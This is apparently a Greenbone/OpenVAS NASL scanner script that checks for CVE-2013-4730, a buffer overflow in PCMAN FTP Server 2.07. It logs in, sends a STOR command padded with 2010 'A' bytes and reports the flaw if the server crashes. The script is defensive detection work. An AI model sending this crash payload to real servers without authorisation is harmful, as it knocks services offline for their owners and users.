# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803875");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2013-4730");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-08-21 16:49:10 +0530 (Wed, 21 Aug 2013)");
  script_name("PCMAN FTP Server STOR Command Buffer Overflow vulnerability");

  script_tag(name:"summary", value:"PCMAN FTP server is prone to a buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted huge request in STOR command and check whether the application
  is crashed or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Flaw is due to an improper sanitation of user supplied input passed via the
  'STOR' command followed by '/../' parameter.");

  script_tag(name:"affected", value:"PCMAN FTP version 2.07, Other versions may also be affected.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to cause denial of
  service condition result in loss of availability for the application.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://1337day.com/exploit/21134");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27703");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080160");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122883");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/pcmans/ftp/detected");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "220 PCMan's FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 PCMan's FTP Server" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

soc = open_sock_tcp(ftpPort);
if(!soc)
  exit(0);

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin){
  ftp_close(socket:soc);
  exit(0);
}

PAYLOAD = crap(data: "\x41", length:2010);

send(socket:soc, data:string("STOR ", PAYLOAD, '\r\n'));
ftp_close(socket:soc);

sleep(3);

soc = open_sock_tcp(ftpPort);
if(!soc){
  security_message(port:ftpPort);
  exit(0);
}

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
ftp_close(socket:soc);
if(!ftplogin){
  security_message(port:ftpPort);
  exit(0);
}
